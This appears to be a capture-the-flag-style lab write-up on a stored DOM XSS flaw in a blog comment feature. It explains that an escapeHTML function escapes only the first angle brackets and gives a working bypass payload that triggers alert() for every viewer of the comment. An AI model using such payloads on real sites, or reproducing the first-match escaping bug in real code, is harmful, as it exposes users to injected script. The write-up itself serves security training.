# Stored DOM XSS
# Objective
This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the `alert()` function.

# Solution
## Analysis
|![](Images/image-43.png)|
|:--:| 
| *Test payload* |

Function `escapeHTML` from `loadCommentsWithVulnerableEscapeHtml.js` escapes characters `<` and `>`.

|![](Images/image-44.png)|
|:--:| 
| *Escape HTML funtion* |

Payload: `<a>a</a> <b>b</b> <c>c</c>` - shows that only first tag was escaped.

## XSS Exploit
The following payload triggers `alert()`:
```
<><img src=0 onerror='alert()'>
```
|![](Images/image-45.png)|
|:--:| 
| *Whenever somone views the comment, payload is triggered* |